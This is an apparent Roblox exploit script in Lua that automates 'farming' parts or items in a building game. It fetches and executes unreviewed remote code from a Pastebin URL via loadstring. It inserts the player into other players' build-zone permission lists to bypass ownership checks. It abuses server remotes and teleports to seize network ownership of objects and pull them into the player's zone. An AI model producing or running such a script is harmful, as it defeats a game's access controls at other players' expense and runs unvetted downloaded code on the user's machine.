local pl = game.Players.LocalPlayer
local pos = pl.Character.HumanoidRootPart.CFrame
local parts = game.Workspace.Parts:GetChildren()
local items = game.Workspace.Items:GetChildren()


if not _G.amount then _G.amount = 100 end
if not _G.summary then _G.summary = 15 end
if not _G.mode then _G.mode = "items" end

_G.toggle = false
task.wait(1)
_G.toggle = true
task.wait(.5)

loadstring(game:HttpGet("http://pastebin.com/raw/nfVbXZ6D", true))()


for i,v in pairs(game.Workspace.BuildZones:GetChildren()) do
    if v.ZoneInfo.OwnerPlayer.Value ~= pl and v.ZoneInfo.OwnerPlayer.Value ~= nil and not v.ZoneInfo.PermissionPlayers:FindFirstChild(pl.Name) then
        print(unpack(v.ZoneInfo.PermissionPlayers:GetChildren()))
        local bypass = Instance.new("ObjectValue") 
        bypass.Parent = v.ZoneInfo.PermissionPlayers
        bypass.Value = pl
        bypass.Name = pl.Name
    end
end
function sum(a)
    x = a.Size.X
    y = a.Size.Y
    z = a.Size.Z
    return x + y + z
end
local nof = "Started Farming "..tostring(_G.amount).." "..tostring(_G.mode)
_G.notify(nof, 10, 17)
if _G.mode == "parts" then
    for j,k in pairs(game.Workspace.BuildZones:GetChildren()) do
        if k.ZoneInfo.OwnerPlayer.Value == pl then 
            for i=1,#parts do
                if i < _G.amount and parts[i].Anchored == false and sum(parts[i]) >= _G.summary and _G.toggle == true then
                    for o=1, 3 do
                        local partPos = parts[i].CFrame
                        pl.Character.HumanoidRootPart.CFrame = parts[i].CFrame
                        pl.Character.Humanoid.PlatformStand = true
                        pcall(function()
                            game:GetService("ReplicatedStorage").Remotes.ClientRequestOwnership:FireServer(parts[i])
                        end)
                        pl.Character.HumanoidRootPart.CFrame = pos
                        game:GetService("ReplicatedStorage").Remotes.ClientCutProcess:FireServer(parts[i], 
                            CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1), 
                            Vector3.new(0, 0, 1), 
                            0.99)
                        parts[i].CFrame = parts[i].CFrame + Vector3.new(0, 1, 0)
                        parts[i].CFrame = k.Main.CFrame + Vector3.new(0, 15, 0)
                        parts[i].Velocity = Vector3.new(0, 0, 0)
                        parts[i].AssemblyAngularVelocity = Vector3.new(0,0,0)
                        pl.Character.HumanoidRootPart.CFrame = pos
                        pl.Character.HumanoidRootPart.Velocity = Vector3.new(0,0,0)
                        pl.Character.HumanoidRootPart.AssemblyAngularVelocity = Vector3.new(0,0,0)
                        pl.Character.Humanoid.PlatformStand = false
                        pl.Character.HumanoidRootPart.CFrame = pos
                        game:GetService("ReplicatedStorage").Remotes.LoadSave:InvokeServer("ClearBuildZone")
                    end
                end
            end
        end
    end
elseif _G.mode == "items" then
for ___,k in pairs(game.Workspace.BuildZones:GetChildren()) do
    if k.ZoneInfo.OwnerPlayer.Value == pl then 
        for j=1,#items do
            local suc, res = pcall(function()
                if j < _G.amount and items[j].PrimaryPart.Anchored == false and _G.toggle == true then
                    local partPos = items[j].PrimaryPart.CFrame
                        task.spawn(function()
                            for i=1, 50 do task.wait()
                                game:GetService("ReplicatedStorage").Remotes.ClientRequestOwnership:FireServer(items[j])
                            end
                        end)
                        task.wait()
                        pl.Character.HumanoidRootPart.CFrame = items[j].PrimaryPart.CFrame + Vector3.new(0,-10,0)
                        pl.Character.Humanoid.PlatformStand = true
                        pl.Character.Humanoid.Sit = true
                        task.wait(.3)
                        pl.Character.HumanoidRootPart.CFrame = pos
                        game:GetService("ReplicatedStorage").Remotes.ClientRequestOwnership:FireServer(items[j].PrimaryPart)
                        --items[j].PrimaryPart.CFrame = k.Main.CFrame + Vector3.new(0, 15, 0)
                        items[j]:MoveTo(k.Main.CFrame.Position + Vector3.new(0, 15, 0))
                        pl.Character.HumanoidRootPart.CFrame = items[j].PrimaryPart.CFrame
                        items[j].PrimaryPart.Velocity = Vector3.new(0, 0, 0)
                        items[j].PrimaryPart.AssemblyAngularVelocity = Vector3.new(0,0,0)
                        pl.Character.HumanoidRootPart.CFrame = pos
                        pl.Character.HumanoidRootPart.Velocity = Vector3.new(0,0,0)
                        pl.Character.HumanoidRootPart.AssemblyAngularVelocity = Vector3.new(0,0,0)
                        pl.Character.Humanoid.PlatformStand = false
                        pl.Character.HumanoidRootPart.CFrame = pos

                    game:GetService("ReplicatedStorage").Remotes.LoadSave:InvokeServer("ClearBuildZone")
                end
            end)
        if not suc then warn("Ашибачка:\n"..res) end
        end
    end
end
end
pl.Character.Humanoid.Sit = false
pl.Character.Humanoid.PlatformStand = false
pl.Character.HumanoidRootPart.CFrame = pos
game:GetService("ReplicatedStorage").Remotes.LoadSave:InvokeServer("ClearBuildZone")


